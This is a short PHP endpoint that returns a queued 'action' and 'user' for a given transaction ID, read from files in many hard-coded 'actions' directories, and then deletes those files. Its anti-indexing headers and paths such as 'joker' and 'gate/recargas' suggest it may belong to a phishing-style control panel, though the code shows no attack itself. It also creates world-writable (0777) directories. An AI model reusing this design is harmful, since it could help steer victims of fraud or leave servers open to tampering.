<?php
session_start();
header('Content-Type: application/json');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('X-Robots-Tag: noindex, nofollow, noarchive');

$jsonRaw = file_get_contents('php://input');
$json = json_decode($jsonRaw, true);

$transactionId = $_REQUEST['transactionId'] ?? $_REQUEST['session_id'] ?? ($_POST['transactionId'] ?? $_POST['session_id'] ?? ($json['transactionId'] ?? $json['session_id'] ?? ''));

if ($transactionId === null || $transactionId === '') {
    echo json_encode(['action' => null, 'user' => null, 'transactionId' => null]);
    exit;
}

$safeTxId = preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $transactionId);

$actionDirs = [
    __DIR__ . '/actions',
    dirname(__DIR__) . '/actions',
    dirname(dirname(__DIR__)) . '/actions',
    __DIR__ . '/../actions',
    __DIR__ . '/../../actions',
    '/var/www/html/actions',
    '/var/www/joker/actions',
    '/var/www/html/datac/actions',
    '/var/www/html/gate/recargas/transaction/actions'
];

$actionDirs = array_values(array_unique(array_filter($actionDirs, static function ($dir) {
    return is_string($dir) && $dir !== '';
})));

$action = null;
$user = null;
if ($safeTxId !== '') {
    foreach ($actionDirs as $actionDir) {
        if (!is_dir($actionDir)) {
            @mkdir($actionDir, 0777, true);
        }
        @chmod($actionDir, 0777);

        $txFile = $actionDir . '/' . $safeTxId . '.txt';
        $metaFile = $actionDir . '/' . $safeTxId . '.meta.json';

        if (file_exists($txFile)) {
            $fileContent = trim((string) file_get_contents($txFile));
            if ($fileContent !== '') {
                // Keep the first non-empty action found
                if ($action === null) {
                    $action = $fileContent;
                    if (file_exists($metaFile)) {
                        $decoded = json_decode((string) file_get_contents($metaFile), true);
                        if (is_array($decoded) && !empty($decoded['user'])) {
                            $user = $decoded['user'];
                        }
                    }
                }
            }
            // Clean up action files in every directory to avoid stale duplicates
            @unlink($txFile);
            @unlink($metaFile);
        }
    }
}

echo json_encode(['action' => $action, 'user' => $user, 'transactionId' => $safeTxId]);
